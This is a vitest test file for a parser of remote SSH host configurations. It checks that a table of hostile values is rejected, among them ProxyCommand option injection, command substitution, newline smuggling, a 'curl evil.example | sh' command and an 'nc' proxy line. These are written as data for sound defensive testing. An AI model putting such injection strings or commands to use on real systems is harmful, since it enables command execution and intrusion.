import { chmod, mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { type HostsSnapshot, MAX_HOSTS_FILE_BYTES, RemoteHostRegistry, RemoteHostsFileError, isSafeHostname, isSafeLocalPath, isSafeUser, parseRemoteHostsFile } from './hosts-file.js';

const valid = { id: 'build-box', name: 'Build box', hostname: 'build.internal.example' };
const file = (...hosts: unknown[]) => JSON.stringify({ hosts });

/** The error message for a file, or null when the file is accepted. */
function rejection(text: string): string | null {
  try {
    parseRemoteHostsFile(text);
    return null;
  } catch (error) {
    expect(error).toBeInstanceOf(RemoteHostsFileError);
    return (error as Error).message;
  }
}

describe('the remote hosts file', () => {
  it('accepts a minimal entry and fills in the defaults', () => {
    expect(parseRemoteHostsFile(file(valid))).toEqual([
      { id: 'build-box', name: 'Build box', hostname: 'build.internal.example', user: null, port: 22, identityFile: null, jumpHost: null, defaultDirectory: null, agents: false, hostKeyChecking: 'strict' },
    ]);
    expect(parseRemoteHostsFile('{"hosts":[]}')).toEqual([]);
  });

  it('accepts every field, and a host behind a jump host', () => {
    const full = {
      id: 'gpu-1',
      name: 'GPU 机器',
      hostname: '10.20.30.40',
      user: 'dev_ops.1',
      port: 2222,
      identityFile: '/home/studio/.ssh/id_ed25519',
      jumpHost: 'bastion',
      defaultDirectory: '/srv/work/project-1',
      agents: true,
      hostKeyChecking: 'accept-new',
    };
    const hosts = parseRemoteHostsFile(file({ id: 'bastion', name: 'Bastion', hostname: '2001:db8::10' }, full));
    expect(hosts[1]).toEqual(full);
    expect(hosts[0]).toMatchObject({ hostname: '2001:db8::10', jumpHost: null });
  });

  const hostile: Array<[string, Record<string, unknown>, string]> = [
    // id
    ['an id in capitals', { id: 'Build' }, 'hosts[0].id'],
    ['an id that starts with a dash', { id: '-box' }, 'hosts[0].id'],
    ['an id that ends with a dash', { id: 'box-' }, 'hosts[0].id'],
    ['an id with a space', { id: 'my box' }, 'hosts[0].id'],
    ['an id of 33 characters', { id: 'a'.repeat(33) }, 'hosts[0].id'],
    ['an empty id', { id: '' }, 'hosts[0].id'],
    ['an id with shell punctuation', { id: 'a;b' }, 'hosts[0].id'],
    ['an id that is a path', { id: '../etc' }, 'hosts[0].id'],
    ['a numeric id', { id: 7 }, 'hosts[0].id'],
    // name
    ['an empty name', { name: '' }, 'hosts[0].name'],
    ['a blank name', { name: '   ' }, 'hosts[0].name'],
    ['a name of 41 characters', { name: 'n'.repeat(41) }, 'hosts[0].name'],
    ['a name with a control character', { name: `bell${String.fromCharCode(7)}` }, 'hosts[0].name'],
    ['a name with an escape sequence', { name: `${String.fromCharCode(27)}[31mred` }, 'hosts[0].name'],
    ['a name that starts with a dash', { name: '-rf' }, 'hosts[0].name'],
    ['a name with surrounding spaces', { name: ' padded ' }, 'hosts[0].name'],
    // hostname
    ['a host name that is an option', { hostname: '-oProxyCommand=evil' }, 'hosts[0].hostname'],
    ['a host name with a space', { hostname: 'host name' }, 'hosts[0].hostname'],
    ['a host name with a command separator', { hostname: 'host;reboot' }, 'hosts[0].hostname'],
    ['a host name with a user in it', { hostname: 'root@host' }, 'hosts[0].hostname'],
    ['a host name with a port in it', { hostname: 'host:22' }, 'hosts[0].hostname'],
    ['a bracketed address', { hostname: '[::1]' }, 'hosts[0].hostname'],
    ['an address with a zone', { hostname: 'fe80::1%eth0' }, 'hosts[0].hostname'],
    ['a host name with a dollar sign', { hostname: 'exa$mple.com' }, 'hosts[0].hostname'],
    ['a host name with command substitution', { hostname: '$(id).example.com' }, 'hosts[0].hostname'],
    ['a host name with a backtick', { hostname: '`id`' }, 'hosts[0].hostname'],
    ['a host name with an empty label', { hostname: 'a..b' }, 'hosts[0].hostname'],
    ['a host name with a leading dot', { hostname: '.example.com' }, 'hosts[0].hostname'],
    ['a host name with a trailing dot', { hostname: 'example.com.' }, 'hosts[0].hostname'],
    ['a label that starts with a dash', { hostname: 'ok.-bad.example' }, 'hosts[0].hostname'],
    ['a host name with an underscore', { hostname: 'my_host' }, 'hosts[0].hostname'],
    ['a host name with a slash', { hostname: 'host/path' }, 'hosts[0].hostname'],
    ['a host name with a line break', { hostname: 'host\nProxyCommand evil' }, 'hosts[0].hostname'],
    ['a host name with a percent token', { hostname: 'host%h' }, 'hosts[0].hostname'],
    ['a host name that is too long', { hostname: `${'a'.repeat(60)}.`.repeat(5).slice(0, 254) }, 'hosts[0].hostname'],
    ['an empty host name', { hostname: '' }, 'hosts[0].hostname'],
    ['a missing host name', { hostname: undefined }, 'hosts[0].hostname'],
    // user
    ['a user that is an option', { user: '-oProxyCommand=evil' }, 'hosts[0].user'],
    ['a user with a space', { user: 'ro ot' }, 'hosts[0].user'],
    ['a user with a command separator', { user: 'root;id' }, 'hosts[0].user'],
    ['a user with a host in it', { user: 'root@elsewhere' }, 'hosts[0].user'],
    ['an empty user', { user: '' }, 'hosts[0].user'],
    ['a user of 33 characters', { user: 'u'.repeat(33) }, 'hosts[0].user'],
    ['a user that starts with a dot', { user: '.hidden' }, 'hosts[0].user'],
    ['a user with command substitution', { user: '$(id)' }, 'hosts[0].user'],
    ['a user with a line break', { user: 'root\n' }, 'hosts[0].user'],
    // port
    ['port zero', { port: 0 }, 'hosts[0].port'],
    ['a port above the range', { port: 65536 }, 'hosts[0].port'],
    ['a negative port', { port: -22 }, 'hosts[0].port'],
    ['a fractional port', { port: 22.5 }, 'hosts[0].port'],
    ['a port given as text', { port: '22' }, 'hosts[0].port'],
    ['a port that carries an option', { port: '22 -oProxyCommand=evil' }, 'hosts[0].port'],
    // identity file
    ['a relative key path', { identityFile: 'keys/id_ed25519' }, 'hosts[0].identityFile'],
    ['a key path with a tilde', { identityFile: '~/.ssh/id_ed25519' }, 'hosts[0].identityFile'],
    ['a key path with a space', { identityFile: '/home/me/my keys/id' }, 'hosts[0].identityFile'],
    ['a key path with a parent step', { identityFile: '/home/me/../root/.ssh/id' }, 'hosts[0].identityFile'],
    ['a key path with a dot segment', { identityFile: '/home/./me/id' }, 'hosts[0].identityFile'],
    ['a key path with an empty segment', { identityFile: '/home//me/id' }, 'hosts[0].identityFile'],
    ['a key path with a trailing slash', { identityFile: '/home/me/' }, 'hosts[0].identityFile'],
    ['a key path whose segment starts with a dash', { identityFile: '/home/-oProxyCommand=evil' }, 'hosts[0].identityFile'],
    ['a key path with a percent token', { identityFile: '/home/%u/id' }, 'hosts[0].identityFile'],
    ['a key path with a command separator', { identityFile: '/tmp/key;id' }, 'hosts[0].identityFile'],
    ['a key path with command substitution', { identityFile: '/tmp/$(id)' }, 'hosts[0].identityFile'],
    ['a key path with a backtick', { identityFile: '/tmp/`id`' }, 'hosts[0].identityFile'],
    ['a key path with a quote', { identityFile: "/tmp/it's" }, 'hosts[0].identityFile'],
    ['a key path with a line break', { identityFile: '/tmp/key\n-oProxyCommand=evil' }, 'hosts[0].identityFile'],
    ['the root directory as a key', { identityFile: '/' }, 'hosts[0].identityFile'],
    ['a key path that is too long', { identityFile: '/k'.repeat(201) }, 'hosts[0].identityFile'],
    ['an option instead of a key path', { identityFile: '-i' }, 'hosts[0].identityFile'],
    // default directory
    ['a relative directory', { defaultDirectory: 'work' }, 'hosts[0].defaultDirectory'],
    ['a home-relative directory', { defaultDirectory: '~/work' }, 'hosts[0].defaultDirectory'],
    ['a directory with a space', { defaultDirectory: '/srv/my work' }, 'hosts[0].defaultDirectory'],
    ['a directory with a command separator', { defaultDirectory: '/srv;reboot' }, 'hosts[0].defaultDirectory'],
    ['a directory with a single quote', { defaultDirectory: "/srv/it's" }, 'hosts[0].defaultDirectory'],
    ['a directory with a double quote', { defaultDirectory: '/srv/"x"' }, 'hosts[0].defaultDirectory'],
    ['a directory with a dollar sign', { defaultDirectory: '/srv/$HOME' }, 'hosts[0].defaultDirectory'],
    ['a directory with a backtick', { defaultDirectory: '/srv/`id`' }, 'hosts[0].defaultDirectory'],
    ['a directory with a parent step', { defaultDirectory: '/srv/../etc' }, 'hosts[0].defaultDirectory'],
    ['a directory whose segment starts with a dash', { defaultDirectory: '/srv/-rf' }, 'hosts[0].defaultDirectory'],
    ['a directory with a line break', { defaultDirectory: '/srv\n/etc' }, 'hosts[0].defaultDirectory'],
    ['a directory that is too long', { defaultDirectory: '/d'.repeat(151) }, 'hosts[0].defaultDirectory'],
    // switches
    ['agents given as text', { agents: 'yes' }, 'hosts[0].agents'],
    ['agents given as a number', { agents: 1 }, 'hosts[0].agents'],
    ['host key checking turned off', { hostKeyChecking: 'no' }, 'hosts[0].hostKeyChecking'],
    ['host key checking set to off', { hostKeyChecking: 'off' }, 'hosts[0].hostKeyChecking'],
    ['host key checking set to ask', { hostKeyChecking: 'ask' }, 'hosts[0].hostKeyChecking'],
    ['host key checking given as a boolean', { hostKeyChecking: false }, 'hosts[0].hostKeyChecking'],
    // jump host
    ['a jump host id that is malformed', { jumpHost: '-J evil' }, 'hosts[0].jumpHost'],
    ['a jump host that is not in the file', { jumpHost: 'nowhere' }, 'hosts[0].jumpHost'],
    ['a host that jumps through itself', { jumpHost: 'build-box' }, 'hosts[0].jumpHost'],
    // unknown keys
    ['a command', { command: 'curl evil.example | sh' }, 'hosts[0]'],
    ['a proxy command', { proxyCommand: 'nc %h %p' }, 'hosts[0]'],
    ['extra SSH options', { options: ['-oStrictHostKeyChecking=no'] }, 'hosts[0]'],
    ['a misspelt key', { hostName: 'x.example' }, 'hosts[0]'],
  ];

  it.each(hostile)('rejects %s', (_what, override, where) => {
    const message = rejection(file({ ...valid, ...override }));
    expect(message, 'the file must be rejected').not.toBeNull();
    expect(message).toContain(where);
    // The message names the field and the rule; it never repeats a value from the file.
    for (const value of Object.values(override)) {
      if (typeof value === 'string' && value.length >= 4 && !['strict', 'accept-new'].includes(value)) expect(message).not.toContain(value);
    }
    expect(message).not.toMatch(/evil|reboot|\$\(|`/);
    expect(message!.length).toBeLessThan(700);
  });

  it('rejects the whole file when one of several hosts is wrong', () => {
    const message = rejection(file(valid, { ...valid, id: 'second', hostname: 'ok.example' }, { ...valid, id: 'third', port: 70000 }));
    expect(message).toBe('hosts[2].port: must be a whole number from 1 to 65535');
  });

  it('rejects duplicate ids, chained jump hosts and too many hosts', () => {
    expect(rejection(file(valid, { ...valid, name: 'Twin' }))).toBe('hosts[1].id: is the same as hosts[0].id');
    const chain = file({ ...valid, id: 'a', jumpHost: 'b' }, { ...valid, id: 'b', jumpHost: 'c' }, { ...valid, id: 'c' });
    expect(rejection(chain)).toContain('hosts[0].jumpHost: names a host that is itself reached through a jump host');
    const many = Array.from({ length: 17 }, (_unused, index) => ({ ...valid, id: `host-${index}` }));
    expect(rejection(file(...many))).toBe('hosts: lists more than 16 hosts');
    expect(parseRemoteHostsFile(file(...many.slice(0, 16)))).toHaveLength(16);
  });

  it.each([
    ['text that is not JSON', '{ hosts: [ nope', 'the file is not valid JSON'],
    ['an empty file', '', 'the file is not valid JSON'],
    ['a list at the top', '[]', 'the file: has the wrong type (expected object)'],
    ['a missing hosts list', '{}', 'hosts: has the wrong type (expected array)'],
    ['hosts that is not a list', '{"hosts":{}}', 'hosts: has the wrong type (expected array)'],
    ['an unknown key at the top', '{"hosts":[],"include":"/etc/passwd"}', 'the file: unknown key "include"'],
    ['a host that is not an object', '{"hosts":["build.example"]}', 'hosts[0]: has the wrong type (expected object)'],
    ['null', 'null', 'the file: has the wrong type (expected object)'],
  ])('rejects %s', (_what, text, message) => {
    expect(rejection(text)).toBe(message);
  });

  it('describes unknown keys without letting them write into the log', () => {
    const key = `evil${String.fromCharCode(27)}[2J"\\${'x'.repeat(80)}`;
    const message = rejection(JSON.stringify({ hosts: [{ ...valid, [key]: 1 }] }))!;
    expect(message.startsWith('hosts[0]: unknown key "evil?[2J??xxxx')).toBe(true);
    // eslint-disable-next-line no-control-regex
    expect(message).not.toMatch(/[\u0000-\u001f]/);
    expect(message.length).toBeLessThan(120);
  });

  it('reports several problems at once, but not endlessly', () => {
    const bad = Array.from({ length: 9 }, (_unused, index) => ({ ...valid, id: `h${index}`, port: 0 }));
    const message = rejection(file(...bad))!;
    expect(message.split('; ')).toHaveLength(6);
    expect(message.endsWith('and 4 more')).toBe(true);
  });
});

describe('field rules', () => {
  it('accept what real hosts look like', () => {
    for (const name of ['localhost', 'a', 'build-01.internal.example', '10.0.0.5', '2001:db8::1', '::1', 'xn--bcher-kva.example', 'A.B-c.D']) expect(isSafeHostname(name), name).toBe(true);
    for (const user of ['root', 'dev_ops', 'user.name', 'u-1', '_svc', '0day']) expect(isSafeUser(user), user).toBe(true);
    for (const key of ['/home/me/.ssh/id_ed25519', '/etc/studio/keys/build+deploy@host.pem', '/k']) expect(isSafeLocalPath(key), key).toBe(true);
  });

  it('reject values of the wrong type', () => {
    for (const value of [undefined, null, 22, {}, ['host'], true]) {
      expect(isSafeHostname(value)).toBe(false);
      expect(isSafeUser(value)).toBe(false);
      expect(isSafeLocalPath(value)).toBe(false);
    }
  });
});

describe('reading the file from disk', () => {
  let directory: string;
  let hostsFile: string;
  let changes: HostsSnapshot[];
  let registry: RemoteHostRegistry;

  beforeEach(async () => {
    directory = await mkdtemp(path.join(os.tmpdir(), 'agent-studio-hosts-'));
    hostsFile = path.join(directory, 'remote-hosts.json');
    changes = [];
    registry = new RemoteHostRegistry(hostsFile, (snapshot) => changes.push(snapshot));
  });
  afterEach(async () => {
    await rm(directory, { recursive: true, force: true });
  });

  const write = (content: string, mode = 0o600) => writeFile(hostsFile, content, { mode }).then(() => chmod(hostsFile, mode));

  it('treats a missing file as "no hosts"', async () => {
    expect(await registry.snapshot()).toEqual({ status: 'missing', hosts: [], message: null });
    expect(await registry.snapshot()).toEqual({ status: 'missing', hosts: [], message: null });
    expect(changes).toHaveLength(1);
  });

  it('reads the file once and again only when it changed', async () => {
    await write(file(valid));
    const first = await registry.snapshot();
    expect(first).toMatchObject({ status: 'ok', message: null });
    expect(first.hosts.map((host) => host.id)).toEqual(['build-box']);
    // Unchanged: the very same result, without parsing again.
    expect(await registry.snapshot()).toBe(first);
    expect(changes).toHaveLength(1);

    await write(file(valid, { ...valid, id: 'second', hostname: 'two.example' }));
    const second = await registry.snapshot();
    expect(second.hosts.map((host) => host.id)).toEqual(['build-box', 'second']);
    expect(changes).toHaveLength(2);

    // A change that keeps the size is noticed too.
    await write(file(valid, { ...valid, id: 'third!', hostname: 'two.example' }).replace('third!', 'thirds'));
    expect((await registry.snapshot()).hosts.map((host) => host.id)).toEqual(['build-box', 'thirds']);
  });

  it('offers no host at all while the file is wrong, and recovers when it is fixed', async () => {
    await write(file(valid));
    expect((await registry.snapshot()).status).toBe('ok');

    await write(file(valid, { ...valid, id: 'broken', hostname: '-oProxyCommand=evil' }));
    expect(await registry.snapshot()).toEqual({ status: 'invalid', hosts: [], message: 'hosts[1].hostname: must be a DNS name or an IP address' });

    await write(file(valid));
    expect((await registry.snapshot()).hosts).toHaveLength(1);

    await rm(hostsFile);
    expect(await registry.snapshot()).toEqual({ status: 'missing', hosts: [], message: null });
    expect(changes.map((snapshot) => snapshot.status)).toEqual(['ok', 'invalid', 'ok', 'missing']);
  });

  it.runIf(process.platform !== 'win32')('refuses a file that other accounts could have written', async () => {
    for (const mode of [0o666, 0o622, 0o660, 0o602]) {
      await write(file(valid), mode);
      expect(await registry.snapshot(), mode.toString(8)).toEqual({
        status: 'invalid',
        hosts: [],
        message: 'the file must not be writable by group or others (chmod 600)',
      });
    }
    // Readable by others is fine: host names are not secrets.
    await write(file(valid), 0o644);
    expect((await registry.snapshot()).status).toBe('ok');
  });

  it('refuses something that is not a regular file, and a file that is too large', async () => {
    await mkdir(hostsFile);
    expect(await registry.snapshot()).toMatchObject({ status: 'invalid', message: 'the path is not a regular file' });
    await rm(hostsFile, { recursive: true });

    await write(`{"hosts":[],"padding":"${'x'.repeat(MAX_HOSTS_FILE_BYTES)}"}`);
    expect(await registry.snapshot()).toMatchObject({ status: 'invalid', message: 'the file is larger than 256 kB' });
  });
});
